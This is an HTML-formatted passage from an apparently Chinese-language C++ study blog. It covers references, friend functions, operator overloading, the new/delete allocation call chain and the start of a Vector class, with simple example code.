class=\"line\">4、引用可以理解成是编译器维护的一个指针，但并不占用空间(如何去理解这句话?).</span><br><span class=\"line\">5、使用引用可以像指针那样去访问、修改对象的内容，但更加安全.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>2、从反汇编的角度说说引用与指针的区  参数传递，读写变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sb = 100;</span><br><span class=\"line\">const int&amp; x = sb;</span><br><span class=\"line\">std::cout&lt;&lt; x &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">sb = 15;</span><br><span class=\"line\">std::cout&lt;&lt; x &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">x = 13;  //error</span><br><span class=\"line\">std::cout&lt;&lt; x &lt;&lt; &quot;\\n&quot;;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/kingcat666/article/details/44852565\">C<ins> 中引用（&amp;）的用法和拷贝 / 赋值函数的区别_c</ins> 拷贝和引用的区别_Zenhobby 的博客 - CSDN 博客</a></p>\n<p>可以参考一下上面的连接，对但不完全对</p>\n<h3 id=\"友元函数\"><a class=\"markdownIt-Anchor\" href=\"#友元函数\">#</a> 友元函数</h3>\n<p>让类外面的方法也可以访问类中的私有成员</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Person</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tPerson(int x, int y)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tthis-&gt;x = x;</span><br><span class=\"line\">\t\tthis-&gt;y = y;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t//声明友元函数</span><br><span class=\"line\">\tfriend void Print(const Person&amp; refPer);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">void Print(const Person&amp; refPer)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tstd::cout &lt;&lt; refPer.x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>友元类让另一个类访问一个类的私有成员</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">什么情况下需要友元函数:</span><br><span class=\"line\">1）运算符重载的某些场合需要使用友元.</span><br><span class=\"line\">2两个类要共享数据的时候.中</span><br><span class=\"line\">友元函数和类的成员函数的区别</span><br><span class=\"line\">(1）成员函数有this指针，而友元函数没有this指针</span><br><span class=\"line\">(2)友元函数是不能被继承的，就像父亲的朋友未必是儿子的朋友</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"运算符重载\"><a class=\"markdownIt-Anchor\" href=\"#运算符重载\">#</a> 运算符重载</h3>\n<p>函数必须返回自己的类型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Number</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tNumber();</span><br><span class=\"line\">\tNumber operator++();</span><br><span class=\"line\">\tNumber operator+(const Number&amp; p);</span><br><span class=\"line\">\t//bool operator&gt;(const Number&amp; p);</span><br><span class=\"line\">\tvoid print();</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Number::Number()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tthis-&gt;x = 1;</span><br><span class=\"line\">\tthis-&gt;y = 2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Number Number::operator++()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tthis-&gt;x++;</span><br><span class=\"line\">\tthis-&gt;y++;</span><br><span class=\"line\">\treturn *this;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Number Number::operator+(const Number&amp; p)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tthis-&gt;x += p.x;</span><br><span class=\"line\">\tthis-&gt;y += p.y;</span><br><span class=\"line\">\t//return Number();</span><br><span class=\"line\">\treturn *this;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void Number::print()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tstd::cout &lt;&lt; this-&gt;x &lt;&lt; &quot; &quot; &lt;&lt; this-&gt;y &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tNumber n;</span><br><span class=\"line\">\tNumber n1;</span><br><span class=\"line\">\tn.print();</span><br><span class=\"line\">\tn = n + n1;</span><br><span class=\"line\">\tn.print();</span><br><span class=\"line\">\tprintf(&quot;Hello World!\\n&quot;);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">. :: ?: sizeof # 不能重载</span><br><span class=\"line\">运算符重载就是函数替换</span><br><span class=\"line\">常用的运算符重载 &lt; &gt; == =</span><br></pre></td></tr></table></figure>\n<p>定义一个类使用友元函数实现重载 operator</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230303155110456.png\" alt=\"image-20230303155110456\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230303155158528.png\" alt=\"image-20230303155158528\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可实现对不同类的操作，不使用友元一定会对<span class=\"keyword\">this</span>操作</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Number</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t<span class=\"type\">int</span> y;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"built_in\">Number</span>();</span><br><span class=\"line\">\t<span class=\"built_in\">Number</span>(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 1</span></span><br><span class=\"line\">\t<span class=\"keyword\">friend</span> Number <span class=\"keyword\">operator</span>++(Number&amp; p1);</span><br><span class=\"line\">\t<span class=\"keyword\">friend</span> Number <span class=\"keyword\">operator</span>--(Number&amp; p1);</span><br><span class=\"line\">\t<span class=\"keyword\">friend</span> Number <span class=\"keyword\">operator</span>+(Number&amp; p1, Number&amp; p2);</span><br><span class=\"line\">\t<span class=\"keyword\">friend</span> Number <span class=\"keyword\">operator</span>-(Number&amp; p1, Number&amp; p2);</span><br><span class=\"line\">\t<span class=\"keyword\">friend</span> Number <span class=\"keyword\">operator</span>*(Number&amp; p1, Number&amp; p2);</span><br><span class=\"line\">\t<span class=\"keyword\">friend</span> Number <span class=\"keyword\">operator</span>/(Number&amp; p1, Number&amp; p2);</span><br><span class=\"line\">\t<span class=\"keyword\">friend</span> <span class=\"type\">bool</span> <span class=\"keyword\">operator</span>&gt;(Number&amp; p1, Number&amp; p2);</span><br><span class=\"line\">\t<span class=\"keyword\">friend</span> <span class=\"type\">bool</span> <span class=\"keyword\">operator</span>&lt;(Number&amp; p1, Number&amp; p2);</span><br><span class=\"line\">\t<span class=\"keyword\">friend</span> <span class=\"type\">bool</span> <span class=\"keyword\">operator</span>&gt;=(Number&amp; p1, Number&amp; p2);</span><br><span class=\"line\">\t<span class=\"keyword\">friend</span> <span class=\"type\">bool</span> <span class=\"keyword\">operator</span>&lt;=(Number&amp; p1, Number&amp; p2);</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">friend</span> <span class=\"type\">void</span> <span class=\"title\">print</span><span class=\"params\">(Number&amp; p1)</span></span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">print</span><span class=\"params\">(Number&amp; p1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tstd::cout &lt;&lt; p1.x &lt;&lt; <span class=\"string\">&quot; &quot;</span> &lt;&lt; p1.y &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Number::<span class=\"built_in\">Number</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>-&gt;x = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>-&gt;y = <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Number::<span class=\"built_in\">Number</span>(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>-&gt;x = x;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>-&gt;y = y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Number <span class=\"keyword\">operator</span>++(Number&amp; p1)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tp1.x++;</span><br><span class=\"line\">\tp1.y++;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Number <span class=\"keyword\">operator</span>--(Number&amp; p1)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tp1.x--;</span><br><span class=\"line\">\tp1.y--;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Number <span class=\"keyword\">operator</span>+(Number&amp; p1, Number&amp; p2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tp1.x += p2.x;</span><br><span class=\"line\">\tp1.y += p2.y;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Number <span class=\"keyword\">operator</span>-(Number&amp; p1, Number&amp; p2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tp1.x -= p2.x;</span><br><span class=\"line\">\tp1.y -= p2.y;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Number <span class=\"keyword\">operator</span>*(Number&amp; p1, Number&amp; p2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tp1.x *= p2.x;</span><br><span class=\"line\">\tp1.y *= p2.y;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Number <span class=\"keyword\">operator</span>/(Number&amp; p1, Number&amp; p2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tp1.x /= p2.x;</span><br><span class=\"line\">\tp1.y /= p2.y;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"keyword\">operator</span>&gt;(Number&amp; p1, Number&amp; p2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p1.x &gt; p2.x &amp;&amp; p1.y &gt; p2.y)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"keyword\">operator</span>&lt;(Number&amp; p1, Number&amp; p2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p1.x &lt; p2.x &amp;&amp; p1.y &lt; p2.y)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"keyword\">operator</span>&gt;=(Number&amp; p1, Number&amp; p2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p1.x &gt;= p2.x &amp;&amp; p1.y &gt;= p2.y)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"keyword\">operator</span>&lt;=(Number&amp; p1, Number&amp; p2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p1.x &lt;= p2.x &amp;&amp; p1.y &lt;= p2.y)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tNumber n1;</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(n1);</span><br><span class=\"line\">\tn1++;</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(n1);</span><br><span class=\"line\">\tn1--;</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(n1);</span><br><span class=\"line\">\t<span class=\"function\">Number <span class=\"title\">n2</span><span class=\"params\">(<span class=\"number\">10</span>,<span class=\"number\">11</span>)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">Number <span class=\"title\">n3</span><span class=\"params\">(<span class=\"number\">100</span>, <span class=\"number\">200</span>)</span></span>;</span><br><span class=\"line\">\tn2 = n2 + n3;</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(n2);</span><br><span class=\"line\">\tn2 = n2 - n3;</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(n2);</span><br><span class=\"line\">\t<span class=\"function\">Number <span class=\"title\">n4</span><span class=\"params\">(<span class=\"number\">100</span>, <span class=\"number\">200</span>)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">Number <span class=\"title\">n5</span><span class=\"params\">(<span class=\"number\">10</span>, <span class=\"number\">50</span>)</span></span>;</span><br><span class=\"line\">\tn4 = n4 / n5;</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(n4);</span><br><span class=\"line\">\tn4 = n4 * n5;</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(n4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (n4 &gt; n5)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; <span class=\"string\">&quot;both n4 x&amp;y &gt; n5 \\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (n4 &lt; n5)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; <span class=\"string\">&quot;both n4 x&amp;y &lt; n5 \\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello World!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"new-delete\"><a class=\"markdownIt-Anchor\" href=\"#new-delete\">#</a> new-delete</h3>\n<p>静态库函数直接编译到 exe 里，dll 在自己模块里</p>\n<p>找 call 时先找函数修改的内存空间，在看哪个 call 改写了这个空间</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">malloc -&gt; _nh_malloc_dbg -&gt; _heap_alloc_dbg -&gt; _heap_alloc_base -&gt; HeapAlloc</span><br><span class=\"line\">free -&gt; free_dbg -&gt; _free_base -&gt; HeapFree</span><br><span class=\"line\">HeapAlloc 和 HeapFree 是Kernel32的 DLL</span><br><span class=\"line\"></span><br><span class=\"line\">new -&gt; _free_dbg -&gt; _nh_malloc_dbg -&gt; _heap_alloc_dbg -&gt; _heap_alloc_base -&gt; HeapAlloc</span><br><span class=\"line\">delete -&gt; free_dbg -&gt; _free_base -&gt; HeapFree</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int* pi = new int;</span><br><span class=\"line\">delete pi;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int* pi = new int(5);   //初始值为5的int</span><br><span class=\"line\"></span><br><span class=\"line\">Person* pa = new Person();</span><br><span class=\"line\"></span><br><span class=\"line\">int* i = new int[5];</span><br><span class=\"line\">delete[] i;</span><br></pre></td></tr></table></figure>\n<h3 id=\"vector\"><a class=\"markdownIt-Anchor\" href=\"#vector\">#</a> Vector</h3>\n<p>1、本质就是一个数组</p>\n<p>2、可以动态扩充容量</p>\n<p>3、支持下标方法，查询性能好</p>\n<p>4、新增数据和删除数据较差</p>\n<p>1、实现一个 Vector 类</p>\n<p>2、读懂每一个方法的反汇编实现</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230304154132126.png\" alt=\"image-20230304154132126\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span 